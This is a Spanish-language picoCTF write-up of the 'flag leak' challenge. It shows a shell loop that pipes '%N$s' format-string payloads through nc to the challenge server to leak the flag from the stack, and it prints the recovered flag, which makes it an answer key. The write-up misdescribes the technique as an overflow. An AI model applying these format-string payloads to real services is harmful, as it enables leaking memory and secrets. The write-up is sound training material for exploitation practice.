# flag leak

# Objetivo
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/93/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/93/vuln.c). And connect with it using:`nc saturn.picoctf.net 50092`

# Pistas
- Format Strings

# Solución
- Iniciamos la instancia
- Decargamos el programa y el codigo fuente
- Creamos el archivo flag.txt que necesita el programa para ir probando
- Le damos permisos de ejecución al programa
- Como el buffer de entrada de la historia esta echo con "%127s" hacemos bucle for el cual se conecte al nc y valla probando poner mas caracteres de los que puede soportar y con esto obtener la bandera
```
┌──(kali㉿kali)-[~/picoctf/binary-explotation/flagleak]
└─$ for i in {0..200}; do echo "%$i\$s" | nc saturn.picoctf.net 54660 | grep -Ei ctf; done 
CTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}
^C
                                                                                                                                                                      
┌──(kali㉿kali)-[~/picoctf/binary-explotation/flagleak]
└─$
```
- A esto ya solo le agregamos el pico...

# Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}

## Notas adicionales
| comando | descripción |
| ------ | ------ |
| xx | xx |

## Referencias
- []()